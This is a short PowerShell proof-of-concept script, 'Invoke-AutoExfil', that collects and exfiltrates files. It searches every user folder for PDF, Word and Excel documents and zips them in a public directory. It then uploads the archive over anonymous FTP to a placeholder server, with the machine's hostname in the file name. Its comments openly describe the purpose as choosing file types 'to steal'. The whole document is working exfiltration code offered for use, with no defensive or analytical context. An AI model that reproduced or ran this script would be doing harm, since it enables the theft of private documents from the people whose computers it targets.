#AutoExfil PoC
function Invoke-AutoExfil
{
    $steal = ".pdf", ".doc", ".docx", ".xls" #Define what file types you want to steal
    $destPath = "C:\Users\Public\Exfil.zip" #Define where you want your files staged
    $hostname=(hostname)

    $files = Get-ChildItem -Force -Recurse -Path C:\users\ -ErrorAction SilentlyContinue | Where {$_.Extension -in $steal} | Select name,fullname
    
    if ($files.Length -ne 0) 
    {
        write-host $files.length
        Compress-Archive -LiteralPath $files.FullName -DestinationPath $destPath

    	$server = "ftp://SERVERIP/" #Define your server IP
    	$webclient = New-Object System.Net.WebClient
    	$webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous","anonymous")

    	$uri = New-Object System.Uri($server+$hostname+"Exfil.zip")
	    $webclient.UploadFile($uri, $destPath)
   }
}
